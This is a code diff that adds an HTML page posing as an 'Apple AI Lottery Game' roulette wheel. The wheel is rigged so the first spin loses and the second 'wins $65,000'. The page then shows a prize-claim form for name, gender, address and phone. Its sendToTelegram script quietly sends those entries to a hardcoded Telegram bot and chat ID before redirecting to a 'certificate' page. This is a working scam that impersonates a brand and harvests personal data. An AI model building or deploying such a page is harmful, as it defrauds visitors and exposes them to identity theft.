@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roulette Madness</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: radial-gradient(circle, #1c1c1c, #000);
+      color: #fff;
+      text-align: center;
+      overflow: hidden;
+    }
+    h1 {
+      margin-top: 30px;
+      color: #f39c12;
+      text-shadow: 2px 2px #000;
+    }
+    #wheelContainer {
+      position: relative;
+      width: 300px;
+      height: 300px;
+      margin: 50px auto;
+      border: 10px solid #ecf0f1;
+      border-radius: 50%;
+      overflow: hidden;
+      box-shadow: 0 0 30px 10px #f1c40f;
+      animation: flash 1s infinite;
+    }
+    #wheel {
+      width: 100%;
+      height: 100%;
+      background: conic-gradient(#e74c3c 0deg 45deg, #2ecc71 45deg 90deg, #3498db 90deg 135deg, #9b59b6 135deg 180deg, #f1c40f 180deg 225deg, #1abc9c 225deg 270deg, #e67e22 270deg 315deg, #95a5a6 315deg 360deg);
+      border-radius: 50%;
+      transition: transform 2s ease-out;
+    }
+    @keyframes flash {
+      0% { box-shadow: 0 0 10px 2px #f1c40f; }
+      50% { box-shadow: 0 0 30px 10px #e67e22; }
+      100% { box-shadow: 0 0 10px 2px #f1c40f; }
+    }
+    #pointer {
+      width: 0;
+      height: 0;
+      border-left: 20px solid transparent;
+      border-right: 20px solid transparent;
+      border-bottom: 40px solid red;
+      position: absolute;
+      top: -30px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 10;
+    }
+    #message {
+      font-size: 24px;
+      margin-top: 20px;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 18px;
+      background-color: #e67e22;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #d35400;
+    }
+    #userForm {
+      display: none;
+      animation: fadeIn 2s forwards;
+      margin-top: 30px;
+    }
+    input, select, textarea {
+      display: block;
+      width: 80%;
+      margin: 10px auto;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(50px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    canvas#confettiCanvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 1000;
+    }
+  </style>
+</head>
+ <header>
+    <div style="background-color: #0000ft; padding: 20px; max-width: 400px; border-radius: 8px; box-shadow: 0 0 10px pink; color: black; text-align: center; font-size: 18px; font-weight: bold;">
+        <img width="35" height="35" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/><font color="gray">Apple AI Lottery Game</font></header>
+<body>
+
+<h1>Roulette Madwheel</h1>
+<canvas id="confettiCanvas"></canvas>
+
+<div id="wheelContainer">
+  <div id="pointer"></div>
+  <div id="wheel"></div>
+</div>
+
+<div id="message">Click the button to spin!</div>
+<button onclick="spinWheel()">Spin</button>
+
+<div id="userForm">
+  <h2>Claim Your $65,000 Prize</h2>
+  <form onsubmit="sendToTelegram(event)">
+    <input type="text" id="fullName" placeholder="Full Name" required>
+    <select id="gender" required>
+      <option value="">Select Gender</option>
+      <option>Male</option>
+      <option>Female</option>
+      <option>Other</option>
+    </select>
+    <input type="text" id="address" placeholder="Address" required>
+    <input type="text" id="phone" placeholder="Phone Number" required>
+    <textarea id="messageText" placeholder="Message (optional)"></textarea>
+    <button type="submit">Claim</button>
+  </form>
+</div>
+
+<!-- Sound Effects -->
+<audio id="spinSound" src="https://www.soundjay.com/mechanical/sounds/mechanical-gear-turning-01.mp3" preload="auto"></audio>
+<audio id="winSound" src="https://www.soundjay.com/human/sounds/applause-01.mp3" preload="auto"></audio>
+
+<script>
+  let round = 1;
+
+  function spinWheel() {
+    const wheel = document.getElementById('wheel');
+    const message = document.getElementById('message');
+    const button = document.querySelector('button');
+    const spinSound = document.getElementById('spinSound');
+    const winSound = document.getElementById('winSound');
+
+    let angle = round === 1 ? 1440 + Math.random() * 45 : 2160 + 200;
+    wheel.style.transition = "transform 2s ease-out";
+    wheel.style.transform = `rotate(${angle}deg)`;
+    button.disabled = true;
+    message.textContent = "Spinning...";
+    spinSound.play();
+
+    setTimeout(() => {
+      if (round === 1) {
+        message.textContent = "Oh no! You lost this round. Try again!";
+        button.textContent = "Spin Again";
+        button.disabled = false;
+        round++;
+      } else {
+        message.textContent = "Congratulations! You won $65,000!";
+        winSound.play();
+        launchConfetti();
+        setTimeout(() => {
+          document.getElementById('wheelContainer').style.display = 'none';
+          button.style.display = 'none';
+          document.getElementById('userForm').style.display = 'block';
+        }, 1500);
+      }
+    }, 2500);
+  }
+
+  function sendToTelegram(e) {
+    e.preventDefault();
+    const token = '7612075949:AAFYpoGkaGHsFsM00zt1QQkKowiBxDORmr0';
+    const chatId = '7486773651';
+    const text = `
+New Roulette Winner Info:
+Name: ${document.getElementById('fullName').value}
+Gender: ${document.getElementById('gender').value}
+Address: ${document.getElementById('address').value}
+Phone: ${document.getElementById('phone').value}
+Message: ${document.getElementById('messageText').value}
+    `;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text })
+    }).then(() => {
+      window.location.href = 'certificate.html';
+    }).catch(error => {
+      alert("Failed to send message. Please try again.");
+      console.error(error);
+    });
+  }
+
+  // Confetti effect
+  function launchConfetti() {
+    const canvas = document.getElementById('confettiCanvas');
+    const ctx = canvas.getContext('2d');
+    const pieces = [];
+    const numPieces = 100;
+
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+
+    for (let i = 0; i < numPieces; i++) {
+      pieces.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height - canvas.height,
+        radius: Math.random() * 6 + 4,
+        color: `hsl(${Math.random() * 360}, 100%, 50%)`,
+        speed: Math.random() * 3 + 2
+      });
+    }
+
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      for (const p of pieces) {
+        ctx.beginPath();
+        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+        ctx.fillStyle = p.color;
+        ctx.fill();
+        p.y += p.speed;
+        if (p.y > canvas.height) p.y = -10;
+      }
+      requestAnimationFrame(draw);
+    }
+    draw();
+  }
+</script>
+
+</body>
+<!-- Footer -->
+    <footer>
+         <img width="20" height="20" src="https://i.postimg.cc/3WnjhLq9/apple.png" alt="mac-os"/>  &copy; 2025 IA Lottery.| All Rights Reserved | Play Smart, Win Big! </p>
+    </footer>
+</html>
